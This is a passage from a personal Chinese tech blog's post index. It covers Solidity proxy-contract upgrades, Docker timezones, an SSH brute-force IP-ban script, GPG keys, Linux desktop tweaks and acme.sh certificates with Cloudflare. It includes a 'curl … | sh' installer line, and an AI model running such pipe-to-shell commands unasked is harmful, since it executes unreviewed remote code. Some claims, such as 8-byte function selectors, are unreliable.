如果在一个合约中，solc编译器会告诉我们函数签名冲突，无法编译，但是代理合约本质是是两个毫不相关的合约，他们的关系是EVM在执行时通过地址加载的，在编译期是看不出来函数冲突的。 通用合约升级方法并没有解决这个问题，而在下面的几种方案中，这个问题会得到妥善的处理。 透明代理模式透明代理模式将用户区分为两种，一种是普通用户，一种是ADMIN用户. 对于普通用户而言，无论是否存在函数选择器冲突，所有请求均转发的逻辑合约。 对于管理员而言，如果存在函数选择器冲突，EVM会优先命中Proxy合约(无论那种都会优先命中Proxy,如果不是admin,最后还是被转发的fallback) contract Proxy{ function update(address _logic) public { if (msg.sender != admin){ fallback(...) }else{ ... } } fallback{ } } 这是一种基于业务的方式来判断的，我们显然的知道，如果是普通用户，那么不可能会去升级合约，所以一定是转发到fallback,而对于管理员，他更关心的是升级功能，所以优先命中Proxy里面的方法. UUPS(通用可升级代理标准)相较与透明代理，UUPS直接将代理合约的升级函数放在逻辑合约中，这样代理合约中实际上不会有任何的逻辑函数，所有的请求都是转发的逻辑合约中处理。 为了规范化合约升级，UUPS提供了固定的代理合约，以及固定的升级函数，需要在逻辑合约中继承Proxiable合约，从而继承其中的升级代码。由于solidity在编译一个合约时可以发现函数选择器的冲突，代理合约完全不需要考虑冲突问题。","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"智能合约","slug":"区块链/智能合约","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://bighu630.github.io/tags/solidity/"},{"name":"合约升级","slug":"合约升级","permalink":"https://bighu630.github.io/tags/%E5%90%88%E7%BA%A6%E5%8D%87%E7%BA%A7/"}],"author":"ivhu"},{"title":"solidity合约升级","slug":"solidity合约升级","date":"2024-11-23T03:43:38.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/11/23/solidity合约升级/","permalink":"https://bighu630.github.io/2024/11/23/solidity%E5%90%88%E7%BA%A6%E5%8D%87%E7%BA%A7/","excerpt":"","text":"为什么要做合约升级就以太坊理想图景而言，合约升级是违背最初的“代码即法律”的构思的. 但是在生产环境中，我们不可不免的需要对已有的代码进行细微的改动（甚至有时候会有较大的改改动）,就连以太坊自身也需要不断的迭代和升级,所以合约升级的问题实际上是《合约升级管理办法》 的问题 合约升级的需求一般有两种需求 合约bug修复 对于一个稍微复杂的dapp系统而言，在合约代码中，几乎不可避免的会存在一些bug,多数bag在测试阶段会被测试人员找到，但是测试也不能保证能找到所有的bug,现实中的扫雷不像是“扫雷”游戏那样，所有的雷都是按照逻辑规则来分布，也没有明确的雷区边界。 越是复杂的合约，越是难以保证不会存在bug（以太坊上的合约漏洞历历在目），如果能通过合约升级来避免漏洞被黑客利用，反倒能更好的保证用户的财产安全. 新增需求 随着dapp的发展，用户规模逐渐加大，最开始设计的产品可能已经无法满足客户的需求，这个时候如果能合理的理由合约升级，可以避免重新再写一套系统的损失。 合约升级的好处 解决合约中潜藏的bug,对bug做必要的修复 允许在原有的dapp系统中新增需求 重新重视dapp合约的生命周期管理（在没有合约升级之前，dapp合约的生命周期是固定的，但是现在可以更灵活的控制dapp的生命周期） 合约升级的弊端 破坏了“代码及法律” 合约升级引来了新的合约漏洞（以太坊上已经有项目被黑） 降低dapp的去中心性(现在大部分的可升级合约都是依赖一个合约管理员来管理合约的升级) 合约升级的关键代理调用（delegatecall）delegatecall是solidity提供的一种低级调用方式，它允许solidity合约在自己的上下问和存储空间中调用其他合约的代码。 简单而言，代理调用就是将其他合约（一般称为逻辑合约）的二进制代码copy过来，然后带当前的环境下执行，在逻辑合约中对EVM内存&#x2F;调用堆&#x2F;存储空间的操作，底下的操作对象是原合约（一般称为）的EVM 由此，我们很容易联想到一种显而易见的合约升级方式,即通过代理的方式，每次升级都是修改逻辑合约的代码（重新部署一个逻辑合约上去）,然后在代理合约中修改逻辑合约的地址，这样以后的每次调用对会指向新的逻辑合约的地址，实现合约中逻辑的升级。 也有一个显而易见的问题：我们没办法升级合约的数据结构，因为在代理调用的过程中使用的是代理合约的内存和存储空间，代理合约本身是不可升级 以及另外一个问题，代理合约和逻辑合约如何保证数据结构的一致？这个问题在后面合约升级方案中会提到。 fallback函数想象这样一种情况，逻辑合约中有30个函数需要被代理，那么代理合约岂不是要写30是个代理函数，用来转发请求？而且如果逻辑合约的升级中需要新增一个函数，代理合约没法升级，新增的函数岂不是代理不到。 关于这些问题，solidity提供了一种特殊的函数,fallback方法，fallback的作用是，在处理一个调用时，如果没有找到对应的方法，合约会重看是否存在fallback方法，如果存在，则交由fallback方法来处理。 fallback() external payable { // fallback方法不需要在前面加function } 通过fallback方法，我们可以不用关心逻辑合约中实现了什么方法，最终所有的请求都交由fallback转发,这样也就解决了上面提到的两个问题. 但是他引入了一个新的问题：代理合约中至少存在一个升级函数（用来升级逻辑合约地址的）,而sol的函数选择器（选择由那个函数来处理请求，fallback是在函数选择器没有找到时的默认调用）是由8byte数据,与升级函数冲突的概率是很大的。而且这个冲突是在编译阶段发现不了的，因为逻辑合约和代理合约不是一起编译的。 在后面我会介绍一些业界成熟对函数选择器冲突的解决方案. 鉴于篇幅，这一篇暂时到这儿.后续…","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"智能合约","slug":"区块链/智能合约","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://bighu630.github.io/tags/solidity/"},{"name":"合约升级","slug":"合约升级","permalink":"https://bighu630.github.io/tags/%E5%90%88%E7%BA%A6%E5%8D%87%E7%BA%A7/"}],"author":"ivhu"},{"title":"为容器设置时区","slug":"为容器设置时区","date":"2024-11-18T07:26:30.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2024/11/18/为容器设置时区/","permalink":"https://bighu630.github.io/2024/11/18/%E4%B8%BA%E5%AE%B9%E5%99%A8%E8%AE%BE%E7%BD%AE%E6%97%B6%E5%8C%BA/","excerpt":"","text":"在构建 Docker 镜像时，你可以通过以下方式设置容器的时区为上海时区： 方法 1：通过 Dockerfile 设置在 Dockerfile 中设置时区，以下是一个示例： FROM your_base_image # 安装时区工具并设置时区 RUN apt-get update &amp;&amp; apt-get install -y tzdata &amp;&amp; \\ ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; \\ echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone &amp;&amp; \\ dpkg-reconfigure -f noninteractive tzdata 方法 2：通过环境变量设置如果你的应用程序支持通过环境变量读取时区设置，可以在 Dockerfile 中添加以下内容： ENV TZ=Asia/Shanghai 并确保镜像中安装了 tzdata 包。 方法 3：运行容器时设置时区在运行容器时，可以通过挂载宿主机的时区配置文件来设置容器的时区： docker run -v /etc/localtime:/etc/localtime:ro -v /etc/timezone:/etc/timezone:ro your_image 方法 4：多阶段构建（优化大小）如果需要优化镜像大小，可以使用多阶段构建的方式，只在构建阶段安装时区工具： FROM your_base_image AS builder RUN apt-get update &amp;&amp; apt-get install -y tzdata &amp;&amp; \\ ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; \\ echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone FROM your_base_image COPY --from=builder /etc/localtime /etc/localtime COPY --from=builder /etc/timezone /etc/timezone 验证时区在容器内验证时区是否正确设置： docker exec -it your_container date","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"容器","slug":"计算机/容器","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E5%AE%B9%E5%99%A8/"}],"tags":[{"name":"容器时区","slug":"容器时区","permalink":"https://bighu630.github.io/tags/%E5%AE%B9%E5%99%A8%E6%97%B6%E5%8C%BA/"}],"author":"ivhu"},{"title":"公网服务器必备-ssh deny","slug":"公网服务器必备-ssh-deny","date":"2024-11-15T08:34:57.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2024/11/15/公网服务器必备-ssh-deny/","permalink":"https://bighu630.github.io/2024/11/15/%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BF%85%E5%A4%87-ssh-deny/","excerpt":"","text":"问题？公网上的服务器被一群无聊的人做密码爆破（我曾经也是其中的一员😀）. 虽然大概率是不会被突破的，但是还是小心为上，所以这一期来看看怎么自动化封ip 不啰嗦直接跳到 ssh 自动封禁 找日志首先我们需要找具体是什么服务正在被爆破，目前最多的是ssh服务，因为一般服务器都会开启ssh来让你远程登陆，当然如果有远程桌面需求的话xrdc&#x2F;vnc服务可能也会开起来 我们以ssh为例： ssh的守护进程是sshd,由systemd管理（大部分服务都是systemd管理的，xrdc&#x2F;vnc也是） 一般而言可以通过journalctl来查看日志 journalctl -u sshd 或者你连接来普罗米修斯之类的监控软件可以用他们来监控日志 可以看到日志的特征如下 可以看到我截图的这里就有人在尝试密码 （Failed开头的） 然后我们需要找到对应服务的日志文件，以便分析日志文件来过来ip地址 剧透一下 ubuntu22 的sshd的日志记录在 /var/log/auth.log 找到包含Failed的行，过滤出ip地址，以及ip错误的次数 cat /var/log/auth.log|awk &#39;/Failed/{print $(NF-3)}&#39;|sort|uniq -c|awk &#39;{print $2&quot;=&quot;$1;}&#39; 封iplinux上面有一个/etc/hosts.deny文件，可以用来封ip 我们只需要找到上面日志中的ip,然后校验ip是否已经被封，如果没有，则将ip写入这个文件 为什么要判断ip是否已经被封禁我们会每隔一段时间读取一下日志文件，封禁有问题的ip,所以以前封禁过的ip还是会捕捉到 ssh 自动封禁这里就直接给出脚本 cat /var/log/auth|awk &#39;/Failed/{print $(NF-3)}&#39;|sort|uniq -c|awk &#39;{print $2&quot;=&quot;$1;}&#39; &gt; /black.list for i in `cat /black.list` do IP=`echo $i |awk -F= &#39;{print $1}&#39;` NUM=`echo $i|awk -F= &#39;{print $2}&#39;` echo $IP=$NUM if [ $NUM -gt 10 ]; then grep $IP /etc/hosts.deny &gt; /dev/null if [ $? -gt 0 ];then echo &quot;sshd:$IP:deny&quot; &gt;&gt; /etc/hosts.deny fi fi done 其中black.list是一个临时文件，随便放哪儿都可以 自动执行脚本 使用crontab -e 打开cron 的编辑器,在最后添加如下 0 */1 * * * sh /脚本绝对路径.sh 这表示1小时执行一次","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"运维","slug":"计算机/运维","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"ssh","slug":"ssh","permalink":"https://bighu630.github.io/tags/ssh/"}],"author":"ivhu"},{"title":"gpg小记","slug":"gpg小记","date":"2024-10-24T09:22:21.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/10/24/gpg小记/","permalink":"https://bighu630.github.io/2024/10/24/gpg%E5%B0%8F%E8%AE%B0/","excerpt":"","text":"什么是GPG&#x2F;openpgpPGP（英语：Pretty Good Privacy，直译：优良保密协议）是一套用于讯息加密、验证的应用程式。 GPG：GUN组织的openpgp实现，GnuPG 密钥生成gpg安装# debian系 apt install gpg # redhat系 yum install gpg 生成主密钥GPG提供了简易的密钥生成方法（–generate-key），这里使用复杂的方法看生成私钥是可以配置那些选项 gpg --full-gen-key --expert 结果是这样的： gpg (GnuPG) 2.4.5; Copyright (C) 2024 g10 Code GmbH This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. 请选择您要使用的密钥类型： (1) RSA 和 RSA (2) DSA 和 Elgamal (3) DSA（仅用于签名） (4) RSA（仅用于签名） (7) DSA（自定义用途） (8) RSA（自定义用途） (9) ECC（签名和加密） *默认* (10) ECC（仅用于签名） (11) ECC（自定义用途） (13) 现有密钥 （14）卡中现有密钥 您的选择是？ 这里可以选择密钥类型，密钥类型只是处于安全考虑，不会影响gpg的使用（也就是不管你用什么类型的签名方案，不影响签名&#x2F;验签时的参数），这里选择RSA， 自定义用途（也就是这里的8,自定义用途是因为我们想要限制这个密钥的功能） RSA 密钥的可实现的功能： 签名（Sign） 认证（Certify） 加密（Encrypt） 身份验证（Authenticate） 目前启用的功能： 签名（Sign） 认证（Certify） 加密（Encrypt） (S) 签名功能开关 (E) 加密功能开关 (A) 身份验证功能开关 (Q) 已完成 您的选择是？ 到这里我们可以选择主密钥的功能。 主密钥不需要签名与加密的功能，保留认证功能来生成子密钥就可以，所以分别输入S 回车 E 回车 Q 回车 RSA 密钥的长度应在 1024 位与 4096 位之间。 您想要使用的密钥长度？(3072) 这里密钥长度可以用默认，但是建议用4096，主密钥一般不用，所以长一点更安全。 请设定这个密钥的有效期限。 0 = 密钥永不过期 &lt;n&gt; = 密钥在 n 天后过期 &lt;n&gt;w = 密钥在 n 周后过期 &lt;n&gt;m = 密钥在 n 月后过期 &lt;n&gt;y = 密钥在 n 年后过期 密钥的有效期限是？(0) 有效期，主密钥可以设置为0，方便管理 输入完成后会提醒你输入主密钥的密码 更改姓名（N）、注释（C）、电子邮件地址（E）或确定（O）/退出（Q）？ o 我们需要生成大量的随机字节。在质数生成期间做些其他操作（敲打键盘 、移动鼠标、读写硬盘之类的）将会是一个不错的主意；这会让随机数 发生器有更好的机会获得足够的熵。 gpg: 吊销证书已被存储为‘/home/home/.gnupg/openpgp-revocs.d/006F375FE8D4C1F404A63B2F44B8540AB57DFB0C.rev’ 公钥和私钥已经生成并被签名。 pub rsa4096 2024-10-24 [C] 006F375FE8D4C1F404A63B2F44B8540AB57DFB0C uid uid 注意主密钥的密码可以为空，为空的话后续操作主密钥就不需要密码，只需要提供私钥就可以 生成子密钥进入密钥管理 gpg --edit-key --expert 006F375FE8D4C1F404A63B2F44B8540AB57DFB0C 注意后面这一段是上面生成的密钥id 在命令行输入addkey 添加密钥 gpg&gt; addkey 请选择您要使用的密钥类型： (3) DSA（仅用于签名） (4) RSA（仅用于签名） (5) ElGamal（仅用于加密） (6) RSA（仅用于加密） (7) DSA（自定义用途） (8) RSA（自定义用途） (10) ECC（仅用于签名） (11) ECC（自定义用途） (12) ECC（仅用于加密） (13) 现有密钥 （14）卡中现有密钥 您的选择是？ 这里选择10,然后选择曲线（这里选什么都不影响操作，只是不同算法的安全属性不一样） 后面的设置与主密钥相同这里略过。 最后的结果： sec rsa4096/44B8540AB57DFB0C 创建于：2024-10-24 有效至：永不 可用于：C 信任度：绝对 有效性：绝对 ssb ed25519/5D132C295B0C40F4 创建于：2024-10-24 有效至：永不 可用于：S ssb表示我们的子密钥，密钥ID是5D132C295B0C40F4 子密钥导出导出公钥gpg -a -o public-file.key --export keyId -a 为 –armor 的简写，表示密钥以 ASCII 的形式输出，默认以二进制的形式输出； -o 为 –output 的简写，指定写入的文件； keyId 可以是key绑定的邮箱 导出私钥gpg -a -o private-file.key --export-secret-keys keyId 导入密钥gpg --import xxxx.key 私钥和公钥导入的方法相同，导入私钥相当于私钥&#x2F;公钥一起导入 公钥分发gpg --send-keys keyId --keyserver hkps://hkps.pool.sks-keyservers.net 使用硬件保存私钥推荐阅读：https://linux.cn/article-10415-1.html 密钥删除一般建议子密钥只保存一份，所以推荐删除主密钥服务器上的子密钥，只保留硬件卡里面的就可以 gpg --delete-secret-keys keyId","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"linux","slug":"计算机/linux","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"}],"tags":[{"name":"gpg","slug":"gpg","permalink":"https://bighu630.github.io/tags/gpg/"}],"author":"ivhu"},{"title":"kde6到hyprland之后的奇怪bug","slug":"kde6到hyprland之后的奇怪bug","date":"2024-10-11T08:36:32.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/10/11/kde6到hyprland之后的奇怪bug/","permalink":"https://bighu630.github.io/2024/10/11/kde6%E5%88%B0hyprland%E4%B9%8B%E5%90%8E%E7%9A%84%E5%A5%87%E6%80%AAbug/","excerpt":"","text":"临床症状kde的部分应用不按照套路显示主题 我使用qt6ct来设置hyprland下qt程序的主题（主要是kde setting好像一到hyprland下面就手短，很多qt程序的主题都控制不了） 正常情况下我用kvantumanager来控制显示样式，然后在qt6ct中指定样式为kvantum.就想下面这样 设置好之后 qt6ct,kde setting,…..等一系列qt程序显示正常（使用的是kvantum的风格），但是kde家族的 konsole dolphin okular,kate这些程序头铁，表示没有配置显示风格，使用默认的breeze. 当然breeze用起来也还不错，就是按钮有点大。 线索然后非常奇怪的是，kate支持强制指定显示样式 在 设置 -&gt; 应用程序样式 里面可以找到kvantum的样式 然后kate的样式就正常了，但是当我尝试去konsole ，dolphin中找相同的配置时。 它们居然没有。 解决在偶然间我发现kde程序的配置文件都是放在 .config目录下面的 比如 kate -&gt; katerc konsole -&gt; konsolerc 所以我去找了一下kate是怎么强制把风格设置为kvantum的 在katerc中搜索 kvantum 看到: [General] ... widgetStyle=kvantum-dark ok,在General标签下设置widgetStyle 在konsole,dolphin的配置文件的对应位置加上这个配置。 解决😄 dolphin: [General] ConfirmClosingMultipleTabs=false ConfirmClosingTerminalRunningProgram=false EditableUrl=true widgetStyle=kvantum-dark 总结虽然只是一点点显示上的问题，但是对于一个强迫症来说还是非常难受的。特别是一个愿意折腾hyprland的强迫症。 另外kde家族也比较有意思，直接把kate配置栏copy下来不香吗，整地有的可以配，有的不能配。","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"linux","slug":"计算机/linux","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"}],"tags":[{"name":"hyprland","slug":"hyprland","permalink":"https://bighu630.github.io/tags/hyprland/"},{"name":"kde","slug":"kde","permalink":"https://bighu630.github.io/tags/kde/"}],"author":"ivhu"},{"title":"linux笔记持续更新","slug":"linux笔记持续更新","date":"2024-09-29T15:18:33.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/09/29/linux笔记持续更新/","permalink":"https://bighu630.github.io/2024/09/29/linux%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/","excerpt":"","text":"krdckrdc 界面关闭组建后无法开启krdc配置文件在 ~&#x2F;.local&#x2F;state&#x2F;krdcstaterc","categories":[],"tags":[],"author":"ivhu"},{"title":"hyprland折腾记录","slug":"hyprland折腾记录","date":"2024-09-29T12:43:58.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/09/29/hyprland折腾记录/","permalink":"https://bighu630.github.io/2024/09/29/hyprland%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/","excerpt":"","text":"最近话了点时间折腾了一下wayland下面的平铺窗口管理器 – hyprland。曾经的dwm选手折腾起hyprland来能一帆风顺吗？ 答案是显然不能。我也是没有解决所有的问题就开始写这篇文章主要是不想继续折腾下去了 先大致看一下成果 借着配置文件大概讲一下# 没什么用的这里用注释解释一下  . ├──  autostart.sh # dwm的自启动脚本 ├──  config # ~/.config 里面的配置文件 │ ├──  alacritty │ ├──  dunst │ ├──  fcitx5 │ ├──  hypr │ ├──  kitty │ ├──  mpd │ ├──  ncmpcpp │ ├──  picom │ ├──  qutebrowser │ ├──  ranger │ ├──  rofi │ ├──  swaync │ └──  waybar ├──  conkyrc # conky的配置，我没用conky了 ├──  dwm # dwm的源码 ├──  install.sh # 一键安装脚本，里面之包含文件复制，没有安装必要软件的功能 ├──  nvim # nvim 的配置 ├──  oh-my-zsh # zsh ├──  tmux # tmux ├──  updata.sh # git push脚本 ├──  vimrc # vim 配置 ├──  zshrc # zshrc └──  zshrc-alias # zshrc依赖 运行 install.sh 脚本将自动备份系统原有文件，并将此处的配置文件拷贝到对应的位置如 nvim 目录，脚本会先将系统中的&#x2F;.config&#x2F;nvim 备份为&#x2F;.config&#x2F;nvimbak 并通过软连接的方式将这里的nvim链接到对应的地方。注意install之后不能删除文件，因为实际上并没有把配置文件复制过去。 目前还没有解决的文件 electron项目分辨率的问题 这里主要是因为我有两块屏幕，一块 3200x2000的高分屏，一块普通的1080p屏幕,electron程序在两块屏幕上的缩放不一样可以通过设置环境变量ELECTRON_OZONE_PLATFORM_HINT=wayland，但是这回导致无法输入中文（目前怀疑是wayland的问题） kde setting ,lxqt-config,qt6ct 等程序一起控制qt的显示样式，导致一个程序一个注意，很难受 typroa无法输入中文（刚刚写博客的时候发现的，不知道好不好解决） 给想从kde转到hyprland的朋友的建议目前hyprland生态比较成熟，但是有极少数应用在体验上对有落差:比如钉钉，钉钉的窗口在hyprland中fctix5是独立管理的，如果你同时还喜欢用kitty作为终端模拟器，那么极有可能钉钉有时候会无法输入中文.如果你恰好有一块高分屏，那你可能得想办法解决一下hyprland的缩放问题.核心问题是hyprland的xwayland与wayland之间存在一点落差,但是大部分应用做的很好（xwayland生态&#x3D;&#x3D; 一锅粥）","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"linux","slug":"计算机/linux","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"}],"tags":[{"name":"hyprland","slug":"hyprland","permalink":"https://bighu630.github.io/tags/hyprland/"}],"author":"ivhu"},{"title":"最好的文件管理器-dolphin","slug":"最好的文件管理器-dolphin","date":"2024-09-23T11:04:30.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2024/09/23/最好的文件管理器-dolphin/","permalink":"https://bighu630.github.io/2024/09/23/%E6%9C%80%E5%A5%BD%E7%9A%84%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8-dolphin/","excerpt":"","text":"WARN：windows没有,废话少说，直接开始 what’s dolphin 长得好看 dolphin使用kde的主题管理，可以通过kde的主题商店配合kvantum manager 配制出一个好看的主题，类似于我上面的(配置mac模式的是最简单的，相信苹果的设计师) 分屏 当然，还有很多其他的文件管理器可以分屏，但是dolphin可以（算是必不可少的） 应用内终端 可以看到上面图中最下面的部分。dolphin内置了konsole终端（kde的很多软件都内置konsole,比如kate）。有了内置终端，你会省很多事情。如果在搭配zorxide .可以在终端中用zoxide切换路径，上面的文件位置也会跟着切换，非常的方便（另外，开启和关闭终端的快捷键是F4） 网络文件夹 这是我最喜欢的功能。首先对于日常使用，我有时候会用到坚果云，阿里云，谷歌云的网盘，这三个网盘都可以接入dolphin 坚果云：使用webdav模式接入 阿里云：稍作麻烦一点 运行aliyun-webdav,将阿里云转换为webdav 通过webdav方式接入 谷歌云：通过kio插件接入 安装软件 在kde的账户管理中登陆谷歌账户 在工作环境中，一般我们后端程序员都会有很多服务器，可能是测试的，可能是我们自己的，我们需要去系统里面拿一点日志看看。 dolphin可以通过ssh连接文件系统，例如我上面的华为云，work等文件夹都是ssh服务器 dolhpin支持的所有网络文件夹： 最关键的是，网络文件夹几乎和真实文件夹差不多，只要网好。 搭配kde connect kde connect是kde的局域网共享软件 dolphin右键集成了kde connect分享功能，只要是喜欢用kde connect的都会感觉很好用 非常推荐kde connect 可以局域网共享文件，共享剪贴板，非常的方便 如图中的bughu-p… 就是我手机的文件系统（需要在手机端给对应文件的访问权限），非常好用。","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"linux","slug":"计算机/linux","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"}],"tags":[{"name":"文件管理器","slug":"文件管理器","permalink":"https://bighu630.github.io/tags/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8/"}],"author":"ivhu"},{"title":"acme+cloudflare生成免费证书（自动续期）","slug":"acme-cloudflare生成免费证书（自动续期）","date":"2024-09-23T00:42:58.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/09/23/acme-cloudflare生成免费证书（自动续期）/","permalink":"https://bighu630.github.io/2024/09/23/acme-cloudflare%E7%94%9F%E6%88%90%E5%85%8D%E8%B4%B9%E8%AF%81%E4%B9%A6%EF%BC%88%E8%87%AA%E5%8A%A8%E7%BB%AD%E6%9C%9F%EF%BC%89/","excerpt":"","text":"acme DNSapiacme DNSapi的作用是在申请证书时使用dns校验，acme可以通过dnsapi在对应的dns管理平台提交对应的dns记录。玩过证书的朋友都知道，证书申请时有三种验证方式: 邮箱验证：需要邮箱与域名绑定（细节要求我没试过） 文件验证：文件验证时证书管理方会要求你在服务器的指定路径上放一个指定文件（内容也是他们定），然后开放80端口，他们会去下载这个文件从而验证你的身份。申请证书时你需要去你的服务器上操作，还要开放指定端口 DNS验证：DNS验证只需要你在dns记录上添加一条TXT记录就可以 我们这里用到的就是DNS验证，DNS验证虽然方便，但是每次申请都需要添加一条DNS记录（申请完成后可以删除，acme好像自动帮忙删除了），如果要实现自动化，acme需要有权限向dns记录方提交记录。 cloudflare DNSapiacme dns api doce 根据上面的文档可以看到cloudflare dns api 有两种方式获取: 生成cloudflare的全局token（全局token拥有cloudflare的所有权限，大部分是acme用不到的） 生成cloudflare的DNS权限token（推荐，够acme用的了） 生成cloudflare的DNS权限token先来cloudflare的Api申请页面 点击这里的创建令牌 选择编辑区域DNS 这个模板（一般来说是第一个） 按照下面的内容填写: 权限选 区域 -&gt; DNS -&gt; 编辑 区域资源 包括 -&gt; 特定区域 -&gt; 在下拉列表里选你的域名（你也可以在第二个框里面选择所有区域） 剩下都不变，点继续，跳转到这个页面: 点击生成令牌，就会产生一个令牌，令牌生成后第一时间记录下来，这个令牌只显示一次，刷新页面后就看不到了。 获取cloudflare的用户信息点到cloudflare中对应的网页管理页面，在api的地方可以看到两个ID: 现在我们有三个信息 上面生成的一个管理DNS的TOKEN 这里的区域ID 这里的账户ID 在对应服务器上生成证书设置环境变量 export CF_Token=&quot;填DNS token&quot; export CF_Zone_ID=&quot;填区域ID&quot; export CF_Account_ID=&quot;填账户ID&quot; 安装acme apt update -y #更新系统 apt install -y curl #安装curl apt install -y socat #安装socat curl https://get.acme.sh | sh 生成证书 acme.sh --issue --dns dns_cf -d test.fun -d &quot;*.test.fun&quot; 如果说找不到acme.sh，可以使用下面的命令 ~/.acme.sh/acme.sh --issue --dns dns_cf -d test.fun -d &quot;*.test.fun&quot; 等他跑码,会告诉你证书的位置 关键是上面两行your cert, your cert key 上面生成的证书是 *.test.fun 的证书，所有的以test.fun结尾的域名都可以用这个证书 推荐的使用方案： 因为acme正常2个月会自动更新一下证书，所以我不推荐你把证书移动到别的位置，因为acme下次生成的时候还会放在这个位置，要么你指定acme的证书生成路径，可以用acme.sh --help 查看怎么指定路径。我使用的方法是（有两个） 直接使用这个路径 通过软连接把证书链接过去 比如我要把证书放在&#x2F;etc&#x2F;nginx&#x2F;ssl 里面 分别命名为cert.crt priv.key我可以这样做 cd /etc/naginx/ssl ln -s /home/ivhu/.acme.sh/证书路径.cer cert.crt ln -s /home/ivhu/acme.sh/证书私钥.key priv.key 证书生成后一般会新建一个cron 的定时认为用来维护证书保证期 可以通过 crontab -e命令查看，我的结果是这样的： 意思是每天凌晨3：28会检查一下证书 如果你的证书是给nginx用的可以在root用户下运行crontab -e 编辑root用户的cron自动化命令 添加如下： 0 4 * * * systemctl reload nginx 表示每天4：00 重启nginx ，因为nginx的证书需要重启之后才能重载。","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"运维","slug":"计算机/运维","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"acme证书","slug":"acme证书","permalink":"https://bighu630.github.io/tags/acme%E8%AF%81%E4%B9%A6/"},{"name":"cloudflare","slug":"cloudflare","permalink":"https://bighu630.github.io/tags/cloudflare/"}],"author":"ivhu"},{"title":"献给一年有四季的人","slug":"献给一年有四季的人","date":"2024-09-22T10:49:02.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2024/09/22/献给一年有四季的人/","permalink":"https://bighu630.github.io/2024/09/22/%E7%8C%AE%E7%BB%99%E4%B8%80%E5%B9%B4%E6%9C%89%E5%9B%9B%E5%AD%A3%E7%9A%84%E4%BA%BA/","excerpt":"","text":"再此写一篇文章献给拥有四季的人: 你应该在春天的时候找到一下有意思的事情，注意他们。 在夏天的时候去挖掘他们，一头扎进他们的世界中，可能是一个领域，可以是一本书，去找到他们的关键。 秋天的时候回过头来看看，看看缺少了什么，写点笔记，捋一捋思路。 冬天好好睡上一觉，等待来年。 瓦尔登湖有说：如果理念告诉你不要这么做，那么你更应该就这么去做，或许你应该在春天的时候好好睡一觉，以便在夏天在睡一觉。也许一个人没必要一年有四季。但是要是你自己认为有四季，那大可以让四季分明.","categories":[{"name":"随笔","slug":"随笔","permalink":"https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/"},{"name":"人生","slug":"随笔/人生","permalink":"https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/%E4%BA%BA%E7%94%9F/"}],"tags":[],"author":"ivhu"},{"title":"以太坊Rollup方案之 